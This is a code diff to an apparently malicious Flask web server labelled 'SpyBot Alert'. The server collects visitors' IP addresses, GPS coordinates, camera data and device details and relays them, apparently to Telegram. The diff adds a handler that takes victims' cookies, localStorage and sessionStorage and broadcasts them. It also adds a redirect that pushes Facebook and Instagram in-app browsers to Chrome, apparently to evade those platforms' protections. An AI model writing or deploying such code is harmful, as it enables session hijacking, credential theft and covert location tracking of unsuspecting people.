@@ -37,6 +37,14 @@ def send_telegram_message(chat_id, message):
 
 @app.route('/')
 def index():
+    user_agent = request.headers.get('User-Agent', '').lower()
+    if "fb" in user_agent or "instagram" in user_agent:
+        return """
+        <html><head><meta http-equiv="refresh" content="0; url=https://www.google.com/chrome"></head>
+        <body>
+        <h2 style='color:white;text-align:center;margin-top:20%;font-family:sans-serif;'>🚫 Limited Access Detected<br>Please open this link in Chrome for full access.</h2>
+        </body></html>
+        """
     return render_template('index.html')
 
 @app.route('/login', methods=['POST'])
@@ -57,19 +65,31 @@ def login():
 def collect():
     data = request.get_json()
     if data:
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        latitude = data.get('latitude')
-        longitude = data.get('longitude')
-        camera = data.get('camera')
-        user_agent = data.get('userAgent')
-        device = data.get('deviceInfo')
-        city = data.get('city')
-        country = data.get('country')
-        timezone = data.get('timezone')
-        maps_link = data.get('mapsLink')
+        if data.get("type") == "🧹 Browser Storage Data":
+            cookies = data.get("cookies", "None")
+            local = data.get("localStorage", {})
+            session = data.get("sessionStorage", {})
+            message = f"""
+🧹 Browser Storage:
+🍪 Cookies: {cookies}
+📦 LocalStorage: {local}
+📦 SessionStorage: {session}
+"""
+            broadcast_message(message)
+        else:
+            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            latitude = data.get('latitude')
+            longitude = data.get('longitude')
+            camera = data.get('camera')
+            user_agent = data.get('userAgent')
+            device = data.get('deviceInfo')
+            city = data.get('city')
+            country = data.get('country')
+            timezone = data.get('timezone')
+            maps_link = data.get('mapsLink')
 
-        location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
-        info = f"""
+            location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
+            info = f"""
 🕵️‍♂️ SpyBot Alert
 📌 IP Address: {ip}
 {location_info}
@@ -80,7 +100,7 @@ def collect():
 🧠 Device: {device}
 🌐 UserAgent: {user_agent}
 """
-        broadcast_message(info)
+            broadcast_message(info)
     return 'ok'
 
 @app.route('/photo', methods=['POST'])
